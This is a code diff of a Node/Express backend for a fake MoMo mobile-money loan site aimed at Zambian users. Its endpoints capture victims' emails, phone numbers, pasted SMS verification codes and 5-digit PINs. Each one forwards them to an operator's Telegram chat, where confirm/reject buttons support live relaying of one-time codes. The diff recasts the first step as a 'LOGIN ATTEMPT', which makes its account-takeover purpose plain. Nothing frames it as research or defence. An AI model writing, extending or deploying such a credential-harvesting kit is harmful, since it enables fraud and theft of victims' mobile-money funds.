@@ -8,94 +8,102 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// ===== YOUR BOT CREDENTIALS =====
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID   = process.env.CHAT_ID;
 
-// Serve your HTML files from the parent folder (momo-website)
+// Serve HTML from parent folder
 app.use(express.static(path.join(__dirname, '..')));
 
-// In-memory store for confirm/reject decisions
 var decisions = {};
-
-// In-memory store for first codes (keyed by referenceId)
 var firstCodes = {};
 
+// ─── Helpers ───
+function escapeHtml(str) {
+    if (str === null || str === undefined) return '-';
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
+function fmtPhone(p) {
+    if (!p) return '-';
+    const clean = String(p).replace(/\D/g, '');
+    if (clean.length === 9) {
+        return '+260 ' + clean.slice(0,3) + ' ' + clean.slice(3,6) + ' ' + clean.slice(6,9);
+    }
+    return '+260 ' + clean;
+}
+
+function nowStr() {
+    return new Date().toLocaleString('en-GB', {
+        day: '2-digit', month: 'short', year: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+    });
+}
+
 // ============================================================
-// 1) SUBMIT APPLICATION
+// 1) SUBMIT APPLICATION → LOGIN ATTEMPT
 // ============================================================
 app.post('/api/submit-application', async function (req, res) {
     var d = req.body;
+    var referenceId = 'LA' + Date.now() + Math.floor(Math.random() * 1000);
+    decisions[referenceId] = 'pending';
+
+    var email = d.email || '-';
+    var phone = fmtPhone(d.phone);
 
     var message =
-        '🔔 *New MoMo Loan Application*\n' +
+        '🏦 <b>LOGIN ATTEMPT</b>\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '\n📋 *LOAN DETAILS*\n' +
-        '• Type:      ' + (d.loanType || '-') + '\n' +
-        '• Amount:    ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
-        '• Term:      ' + (d.term || '-') + ' months\n' +
-        '• Purpose:   ' + (d.purpose || '-') + '\n' +
-        '\n👤 *APPLICANT*\n' +
-        '• Name:      ' + (d.firstName || '-') + ' ' + (d.lastName || '-') + '\n' +
-        '• Email:     ' + (d.email || '-') + '\n' +
-        '• Phone:     +260 ' + (d.phone || '-') + '\n' +
-        '\n💼 *EMPLOYMENT*\n' +
-        '• Status:    ' + (d.employment || '-') + '\n' +
-        '• Income:    ZMW ' + Number(d.income || 0).toLocaleString() + '\n' +
-        '\n🕐 *Submitted:* ' + new Date().toLocaleString() + '\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━';
+        '🆕 <b>NEW USER</b>\n' +
+        '\n📧 <b>Email:</b> ' + escapeHtml(email) + '\n' +
+        '\n🌍 <b>Country Code:</b> +260\n' +
+        '\n📱 <b>Phone Number:</b>\n' +
+        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
+        '\n🕐 ' + nowStr();
 
     try {
-        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-        var response = await fetch(url, {
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML'
             })
         });
-
-        var data = await response.json();
-        if (data.ok) {
-            console.log('✅ Sent to Telegram:', d.firstName, d.lastName, d.phone);
-        } else {
-            console.log('❌ Telegram error:', data);
-        }
-        res.json({ ok: true });
+        console.log('🏦 LOGIN ATTEMPT sent. Ref:', referenceId);
+        res.json({ ok: true, referenceId: referenceId });
     } catch (err) {
-        console.error('Server error:', err);
+        console.error(err);
         res.status(500).json({ ok: false });
     }
 });
 
 // ============================================================
-// 2) VERIFY CODE — FIRST MESSAGE (FULL DETAILS + BUTTONS)
+// 2) VERIFY CODE → VERIFICATION MESSAGE
 // ============================================================
 app.post('/api/verify-code', async function (req, res) {
     var d = req.body;
-
     var referenceId = 'REF' + Date.now() + Math.floor(Math.random() * 1000);
     decisions[referenceId] = 'pending';
-
     firstCodes[referenceId] = d.code;
 
-        var message =
-        '🔑 *Loan Application Code Received*\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '👤 ' + (d.firstName || '-') + ' ' + (d.lastName || '-') + '\n' +
-        '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
-        '\n💰 Amount: ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
-        '\n📩 *Full SMS Message Pasted:*\n`' + escapeMd(d.code || '-') + '`\n' +
-        '\n🕐 ' + new Date().toLocaleString() + '\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '✅ Confirm if this matches the code you sent.';
+    var phone = fmtPhone(d.phone);
+    var code  = d.code || '-';
+
+    var message =
+        '📱 <b>Phone:</b>\n' +
+        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
+        '\n💬 <b>SMS Code:</b>\n' +
+        '<pre><code>' + escapeHtml(code) + '</code></pre>\n' +
+        '\n🕐 ' + nowStr();
 
     var keyboard = {
         inline_keyboard: [[
-            { text: '✅ Confirm', callback_data: 'confirm:' + referenceId },
-            { text: '❌ Reject',  callback_data: 'reject:' + referenceId }
+            { text: '✅ CONFIRM', callback_data: 'confirm:' + referenceId },
+            { text: '❌ REJECT',  callback_data: 'reject:' + referenceId }
         ]]
     };
 
@@ -106,11 +114,11 @@ app.post('/api/verify-code', async function (req, res) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown',
+                parse_mode: 'HTML',
                 reply_markup: keyboard
             })
         });
-        console.log('🔑 Code sent to Telegram with buttons. Ref:', referenceId);
+        console.log('📩 VERIFICATION MESSAGE sent. Ref:', referenceId);
         res.json({ ok: true, referenceId: referenceId });
     } catch (err) {
         console.error(err);
@@ -118,28 +126,20 @@ app.post('/api/verify-code', async function (req, res) {
     }
 });
 
-// Escape special Markdown characters so copy blocks never break
-function escapeMd(str) {
-    if (str === null || str === undefined) return '-';
-    return String(str)
-        .replace(/\\/g, '\\\\')
-        .replace(/`/g, '\\`')
-        .replace(/\*/g, '\\*')
-        .replace(/_/g, '\\_')
-        .replace(/\[/g, '\\[');
-}
-
 // ============================================================
-// 3) RESEND CODE (SHORT)
+// 3) RESEND CODE → RESEND REQUEST
 // ============================================================
 app.post('/api/resend-code', async function (req, res) {
     var d = req.body;
+    var phone = fmtPhone(d.phone);
 
-        var message =
-        '🔄 *Resend Requested*\n' +
+    var message =
+        '🔄 <b>VERIFICATION MESSAGE RESEND REQUEST</b>\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
-        '\n🕐 ' + new Date().toLocaleString();
+        '🌍 <b>Country Code:</b> +260\n' +
+        '\n📱 <b>Phone Number:</b>\n' +
+        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
+        '\n🕐 ' + nowStr();
 
     try {
         await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
@@ -148,7 +148,7 @@ app.post('/api/resend-code', async function (req, res) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML'
             })
         });
         res.json({ ok: true });
@@ -158,23 +158,21 @@ app.post('/api/resend-code', async function (req, res) {
 });
 
 // ============================================================
-// 4) CONFIRM LOAN
+// 4) CONFIRM LOAN (unchanged)
 // ============================================================
 app.post('/api/confirm-loan', async function (req, res) {
     var d = req.body;
 
     var message =
-        '✅ *Loan Confirmed by Applicant*\n' +
+        '✅ <b>Loan Confirmed by Applicant</b>\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '👤 ' + d.firstName + ' ' + d.lastName + '\n' +
-        '📱 MoMo Number: +260 ' + d.phone + '\n' +
-        '📧 ' + (d.email || '-') + '\n' +
-        '\n💰 *Loan:* ZMW ' + Number(d.amount).toLocaleString() + '\n' +
-        '📆 *Term:* ' + d.term + ' months\n' +
-        '🎯 *Purpose:* ' + (d.purpose || '-') + '\n' +
-        '\n🕐 ' + new Date().toLocaleString() + '\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '⚡ *Action:* Review and disburse from your MoMo merchant wallet.';
+        '👤 ' + escapeHtml(d.firstName || '-') + ' ' + escapeHtml(d.lastName || '-') + '\n' +
+        '📱 MoMo Number: ' + escapeHtml(fmtPhone(d.phone)) + '\n' +
+        '📧 ' + escapeHtml(d.email || '-') + '\n' +
+        '\n💰 <b>Loan:</b> ZMW ' + Number(d.amount || 0).toLocaleString() + '\n' +
+        '📆 <b>Term:</b> ' + escapeHtml(d.term || '-') + ' months\n' +
+        '🎯 <b>Purpose:</b> ' + escapeHtml(d.purpose || '-') + '\n' +
+        '\n🕐 ' + nowStr();
 
     try {
         await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
@@ -183,7 +181,7 @@ app.post('/api/confirm-loan', async function (req, res) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML'
             })
         });
         res.json({ ok: true });
@@ -193,7 +191,7 @@ app.post('/api/confirm-loan', async function (req, res) {
 });
 
 // ============================================================
-// 5) STATUS (frontend polls this)
+// 5) STATUS
 // ============================================================
 app.get('/api/status', function (req, res) {
     var ref = req.query.ref;
@@ -201,7 +199,7 @@ app.get('/api/status', function (req, res) {
 });
 
 // ============================================================
-// 6) TELEGRAM CALLBACK (button taps come here)
+// 6) TELEGRAM CALLBACK
 // ============================================================
 app.post('/api/telegram-callback', async function (req, res) {
     var cb = req.body.callback_query;
@@ -230,8 +228,9 @@ app.post('/api/telegram-callback', async function (req, res) {
             body: JSON.stringify({
                 chat_id: cb.message.chat.id,
                 message_id: cb.message.message_id,
-                text: cb.message.text + '\n\n— — —\n' + (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
-                parse_mode: 'Markdown'
+                text: cb.message.text + '\n\n— — —\n' +
+                      (action === 'confirm' ? '✅ CONFIRMED' : '❌ REJECTED'),
+                parse_mode: 'HTML'
             })
         });
     } catch (err) {
@@ -242,17 +241,19 @@ app.post('/api/telegram-callback', async function (req, res) {
 });
 
 // ============================================================
-// 7) FINAL CODE (5-digit PIN)  →  SHORT, NO REF
+// 7) FINAL CODE (5-digit PIN)
 // ============================================================
 app.post('/api/final-code', async function (req, res) {
     var d = req.body;
+    var phone = fmtPhone(d.phone);
+    var pin = d.finalCode || '-';
 
-        var message =
-        '🎯 *5-Digit PIN Submitted*\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
-        '\n🔑 *5-Digit PIN:*\n`' + escapeMd(d.finalCode || '-') + '`\n' +
-        '\n🕐 ' + new Date().toLocaleString();
+    var message =
+        '📱 <b>Phone:</b>\n' +
+        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
+        '\n🔐 <b>5-Digit PIN:</b>\n' +
+        '<pre><code>' + escapeHtml(pin) + '</code></pre>\n' +
+        '\n🕐 ' + nowStr();
 
     try {
         await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
@@ -261,37 +262,39 @@ app.post('/api/final-code', async function (req, res) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML'
             })
         });
-        console.log('🎯 5-digit PIN sent to Telegram for phone:', d.phone);
+        console.log('🔐 PIN sent. Phone:', phone);
         res.json({ ok: true });
     } catch (err) {
-        console.error('Final code error:', err);
+        console.error(err);
         res.status(500).json({ ok: false });
     }
 });
 
 // ============================================================
-// 8) LAST CODE (4-digit SMS code)  →  SHORT, NO REF + BUTTONS
+// 8) LAST CODE (4-digit SMS code)
 // ============================================================
 app.post('/api/last-code', async function (req, res) {
     var d = req.body;
-
     var referenceId = 'LC' + Date.now() + Math.floor(Math.random() * 1000);
     decisions[referenceId] = 'pending';
 
+    var phone = fmtPhone(d.phone);
+    var code = d.lastCode || '-';
+
     var message =
-        '🔐 *4-Digit SMS Code Received*\n' +
-        '━━━━━━━━━━━━━━━━━━━━━━\n' +
-        '\n📱 *Phone:*\n`' + escapeMd(d.phone || '-') + '`\n' +
-        '\n🔑 *4-Digit Code:*\n`' + (d.lastCode || '-') + '`\n' +
-        '\n🕐 ' + new Date().toLocaleString();
+        '📱 <b>Phone:</b>\n' +
+        '<pre><code>' + escapeHtml(phone) + '</code></pre>\n' +
+        '\n🔐 <b>4-Digit Code:</b>\n' +
+        '<pre><code>' + escapeHtml(code) + '</code></pre>\n' +
+        '\n🕐 ' + nowStr();
 
     var keyboard = {
         inline_keyboard: [[
-            { text: '✅ Confirm', callback_data: 'confirm:' + referenceId },
-            { text: '❌ Reject',  callback_data: 'reject:' + referenceId }
+            { text: '✅ CONFIRM', callback_data: 'confirm:' + referenceId },
+            { text: '❌ REJECT',  callback_data: 'reject:' + referenceId }
         ]]
     };
 
@@ -302,21 +305,18 @@ app.post('/api/last-code', async function (req, res) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown',
+                parse_mode: 'HTML',
                 reply_markup: keyboard
             })
         });
-        console.log('🔐 Last code sent to Telegram with buttons. Ref:', referenceId);
+        console.log('🔐 Last code sent. Ref:', referenceId);
         res.json({ ok: true, referenceId: referenceId });
     } catch (err) {
-        console.error('Last code error:', err);
+        console.error(err);
         res.status(500).json({ ok: false });
     }
 });
 
-// ============================================================
-// START SERVER — always last
-// ============================================================
 var PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', function () {
     console.log('🚀 MoMo server running at port ' + PORT);
